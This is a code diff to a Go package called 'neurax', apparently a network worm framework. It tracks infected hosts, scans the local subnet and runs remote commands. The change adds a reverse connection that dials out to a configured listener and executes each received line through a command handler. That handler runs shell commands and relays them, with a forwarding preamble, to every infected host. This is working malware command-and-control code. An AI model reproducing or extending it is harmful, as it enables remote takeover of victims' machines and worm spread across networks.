@@ -1,6 +1,7 @@
 package neurax
 
 import (
+	"bufio"
 	"bytes"
 	"fmt"
 	"io/ioutil"
@@ -24,47 +25,49 @@ import (
 var InfectedHosts = []string{}
 
 type __NeuraxConfig struct {
-	stager         string
-	port           int
-	comm_port      int
-	comm_proto     string
-	local_ip       string
-	path           string
-	file_name      string
-	platform       string
-	cidr           string
-	scan_passive   bool
-	scan_timeout   int
-	read_arp_cache bool
-	threads        int
-	full_range     bool
-	base64         bool
-	required_port  int
-	verbose        bool
-	remove         bool
-	scan_interval  string
+	stager           string
+	port             int
+	comm_port        int
+	comm_proto       string
+	local_ip         string
+	path             string
+	file_name        string
+	platform         string
+	cidr             string
+	scan_passive     bool
+	scan_timeout     int
+	read_arp_cache   bool
+	threads          int
+	full_range       bool
+	base64           bool
+	required_port    int
+	verbose          bool
+	remove           bool
+	scan_interval    string
+	reverse_listener string
 }
 
 var NeuraxConfig = __NeuraxConfig{
-	stager:         "random",
-	port:           6741, //coldfire.RandomInt(2222, 9999),
-	comm_port:      7777,
-	comm_proto:     "udp",
-	required_port:  0,
-	local_ip:       coldfire.GetLocalIp(),
-	path:           "random",
-	file_name:      "random",
-	platform:       runtime.GOOS,
-	cidr:           coldfire.GetLocalIp() + "/24",
-	scan_passive:   false,
-	scan_timeout:   2,
-	read_arp_cache: false,
-	threads:        10,
-	full_range:     false,
-	base64:         false,
-	verbose:        false,
-	remove:         false,
-	scan_interval:  "2m",
+	stager:           "random",
+	port:             6741, //coldfire.RandomInt(2222, 9999),
+	comm_port:        7777,
+	comm_proto:       "udp",
+	required_port:    0,
+	local_ip:         coldfire.GetLocalIp(),
+	path:             "random",
+	file_name:        "random",
+	platform:         runtime.GOOS,
+	cidr:             coldfire.GetLocalIp() + "/24",
+	scan_passive:     false,
+	scan_timeout:     2,
+	read_arp_cache:   false,
+	threads:          10,
+	full_range:       false,
+	base64:           false,
+	verbose:          false,
+	remove:           false,
+	scan_interval:    "2m",
+	reverse_listener: "none",
 }
 
 func ReportError(message string, e error) {
@@ -200,20 +203,27 @@ func NeuraxSignal(addr string) {
 	}
 }*/
 
-func handle_commmand(cmd string) {
+func handle_command(cmd string) {
 	DataSender := coldfire.SendDataUDP
+	forwarded_preamble := ""
 	if NeuraxConfig.comm_proto == "tcp" {
 		DataSender = coldfire.SendDataTCP
 	}
 	preamble := strings.Fields(cmd)[0]
+	if strings.Contains(preamble, "k") {
+		forwarded_preamble = preamble
+	}
 	if strings.Contains(preamble, ":") {
 		cmd = strings.Join(strings.Fields(cmd)[1:], " ")
+		if strings.Contains(preamble, "s") {
+			time.Sleep(time.Duration(coldfire.RandomInt(1, 5)))
+		}
 		if strings.Contains(preamble, "x") {
 			coldfire.CmdOut(cmd)
 		}
 		if strings.Contains(preamble, "a") {
 			for _, host := range InfectedHosts {
-				err := DataSender(host, NeuraxConfig.comm_port, cmd)
+				err := DataSender(host, NeuraxConfig.comm_port, fmt.Sprintf("%s %s", forwarded_preamble, cmd))
 				ReportError("Cannot send command", err)
 			}
 		}
@@ -236,8 +246,17 @@ func NeuraxOpenComm() {
 		buff := make([]byte, 1024)
 		len, _ := conn.Read(buff)
 		cmd := string(buff[:len-1])
-		handle_commmand(cmd)
+		handle_command(cmd)
 		conn.Close()
+	}
+}
+
+func NeuraxReverse() {
+	conn, _ := net.Dial("udp", NeuraxConfig.reverse_listener)
+	for {
+		command, _ := bufio.NewReader(conn).ReadString('\n')
+		command = strings.TrimSuffix(command, "\n")
+		handle_command(command)
 	}
 }
 
